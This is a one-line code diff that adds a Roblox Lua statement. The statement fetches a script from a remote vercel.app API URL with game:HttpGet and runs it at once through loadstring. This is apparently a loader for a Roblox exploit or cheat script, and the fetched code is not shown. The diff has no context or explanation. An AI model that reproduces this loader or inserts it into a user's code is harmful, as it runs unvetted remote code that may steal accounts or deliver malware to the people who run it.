@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://v0-qudra.vercel.app/api/script/361b6872-2749-4a5a-82c5-4ae843e48a1f"))()
